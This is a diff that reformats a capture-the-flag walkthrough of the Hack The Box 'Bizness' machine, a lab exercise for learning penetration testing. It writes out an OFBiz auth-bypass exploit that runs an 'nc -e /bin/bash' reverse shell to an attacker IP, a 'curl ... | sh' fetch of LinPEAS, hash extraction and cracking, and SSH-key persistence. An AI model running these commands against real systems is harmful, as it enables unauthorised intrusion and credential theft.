@@ -24,6 +24,7 @@ NMAP
 ![image3](../resources/9a1adcfedd5e40d1b95f02d12edd408b.png)
 
 - Directory bruteforce (recursive):
+
 ```bash
 ffuf -u https://bizness.htb/FUZZ -recursion -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fw 1
 ```
@@ -42,7 +43,7 @@ ffuf -u https://bizness.htb/FUZZ -recursion -w /usr/share/wordlists/dirbuster/di
 
 ![image7](../resources/e361a49e029b4ec18f42066c9c3d6dee.png)
 
-- I can register (**password123**)
+- I can register  (**password123**)
 
 ![image8](../resources/00adee3881b04c7abcbc7d684ddf7c32.png)
 - But can't log in
@@ -68,10 +69,11 @@ ffuf -u https://bizness.htb/FUZZ -recursion -w /usr/share/wordlists/dirbuster/di
 ![image12](../resources/6e7d84b355cd4ccca6c2c7d3c2d2dab3.png)
 
 - And using the python tool:
-```bash
-git clone <https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git>
 
-python3 exploit.py --url <https://bizness.htb>
+```bash
+git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
+
+python3 exploit.py --url https://bizness.htb
 
 ```
 
@@ -82,6 +84,7 @@ python3 exploit.py --url <https://bizness.htb>
 ![image14](../resources/69aa90309cfb464295aaf588e130c940.png)
 
 - I set up a listener:
+
 ```bash
 rlwrap -cAr nc -lvnp 8081
 
@@ -90,7 +93,7 @@ rlwrap -cAr nc -lvnp 8081
 **nc -e /bin/bash 10.10.14.18 8081**
 
 ```bash
-python3 exploit.py --url <https://bizness.htb> --cmd "nc -e /bin/bash 10.10.14.18 8081"
+python3 exploit.py --url https://bizness.htb --cmd "nc -e /bin/bash 10.10.14.18 8081"
 
 ```
 
@@ -101,31 +104,33 @@ python3 exploit.py --url <https://bizness.htb> --cmd "nc -e /bin/bash 10.10.14.1
 ![image16](../resources/4aab46873a5a447b8dc58e1a88cec2ee.png)
 
 - Upgrade shell:
+
 ```bash
 /usr/bin/script -qc /bin/bash /dev/null
-
+#PRESS Ctrl+Z
 stty raw -echo
-
 fg
 
+#PRESS ENTER
+#PRESS ENTER
+
 export TERM=xterm
-
 stty cols 236 rows 59
-
-PS1="\n\\\033\[1;34m\\\[\\(date +%H%M)\]\[\u@\h:\w\]\$\\\033\[0m\\ "
-
+PS1="\n\[\033[1;34m\][\$(date +%H%M)][\u@\h:\w]$\[\033[0m\] "
 alias ls='ls --color=auto'
-
 reset
-
 clear
+
+#PRESS ENTER
+
 ```
 
 ![image17](../resources/1e066e7572af4b488d8095ba17af0168.png)
 
 - Upload LinPEAS:
+
 ```bash
-curl <http://10.10.14.18:8082/linpeas.sh> \| sh
+curl http://10.10.14.18:8082/linpeas.sh | sh
 
 ```
 
@@ -143,7 +148,8 @@ Normally /opt is empty but in this case it has the directory **ofbiz**
 
 And the service **ofbiz.service**
 
-- Query the service
+- Query the service:
+
 ```bash
 systemctl status ofbiz.service
 
@@ -152,8 +158,9 @@ systemctl status ofbiz.service
 ![image20](../resources/3121db77ca6740a3ac8991f2b105a10b.png)
 
 - Search for credentials within /opt/ofbiz:
+
 ```bash
-grep --color=auto -irnw . -e "credentials" 2\>/dev/null
+grep --color=auto -irnw . -e "credentials" 2>/dev/null
 
 ```
 
@@ -178,6 +185,7 @@ cat /opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml
 - We have a SHA1 hash but the hash is for the password ofbiz, that we found before and it doesn't work
 
 - Try and find other hashes:
+
 ```bash
 grep -E 'SHA' -rnw /opt/ofbiz
 
@@ -186,12 +194,14 @@ grep -E 'SHA' -rnw /opt/ofbiz
 ![image24](../resources/c1bad59dda8f4e5ebea9d450c90f7f74.png)
 
 - More concise grep:
+
 ```bash
 grep -E '\\SHA\\\[a-zA-Z0-9\]+\\\[a-zA-Z0-9\_-\]+' -rnw .
 
 ```
+
 ```bash
-- cat /opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat
+cat /opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat
 ```
 
 ![image25](../resources/fc39e427c2ef41df8fe832816a98ad07.png)
@@ -218,8 +228,9 @@ print(decoded_bytes.hex())
 ![image27](../resources/e5f95b894c744aebbca4a3ca0a525607.png)
 
 - Now, apply mode 120 along with hash and salt format to crack:
+
 ```bash
-hashcat -m 120 -a0 'b8fd3f41a541a435857a8f3e751cc3a91c174362:**d**' /usr/share/wordlists/rockyou.txt
+hashcat -m 120 -a0 'b8fd3f41a541a435857a8f3e751cc3a91c174362:d' /usr/share/wordlists/rockyou.txt
 
 ```
 
@@ -230,6 +241,7 @@ hashcat -m 120 -a0 'b8fd3f41a541a435857a8f3e751cc3a91c174362:**d**' /usr/share/w
 ![image29](../resources/dc47da71fd44403e83862abd94683c49.png)
 
 - Create SSH key to get better shell:
+
 ```bash
 ssh-keygen -t rsa -b 4096
 
@@ -238,6 +250,6 @@ mkdir ~/.ssh
 
 touch ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
-echo "\<id_rsa.pub\>" \>\> ~/.ssh/authorized_keys
+echo "\<id_rsa.pub\>" >> ~/.ssh/authorized_keys
 ssh ofbiz@10.129.18.39 -i id_rsa
 ```
